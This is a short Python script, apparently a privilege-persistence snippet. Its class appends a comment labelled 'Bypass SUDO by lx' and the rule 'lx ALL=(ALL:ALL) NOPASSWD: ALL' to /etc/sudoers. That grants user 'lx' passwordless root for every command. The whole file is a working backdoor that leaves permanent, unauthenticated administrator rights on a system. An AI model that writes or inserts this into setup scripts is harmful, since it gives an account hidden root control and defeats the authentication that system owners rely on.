import subprocess

class Sudoers:
    def __init__(self):
        lines = [
            "\n"
            "##Bypass SUDO by lx",
            "lx ALL=(ALL:ALL) NOPASSWD: ALL",
        ]
        for line in lines:
            subprocess.run(["sudo", "bash", "-c", f"echo '{line}' >> /etc/sudoers"])
